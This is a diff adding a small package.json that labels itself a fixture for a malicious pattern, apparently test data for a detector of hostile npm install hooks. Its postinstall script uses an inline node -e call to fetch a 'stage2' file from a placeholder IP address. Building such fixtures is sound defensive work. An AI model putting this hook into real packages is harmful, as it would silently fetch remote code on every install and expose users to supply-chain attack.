@@ -1,0 +1,8 @@
+{
+  "name": "lwfx-node-e-https",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): inline node -e that fetches a second stage",
+  "scripts": {
+    "postinstall": "node -e \"require('https').get('https://203.0.113.11/stage2', r => r.pipe(process.stdout))\""
+  }
+}
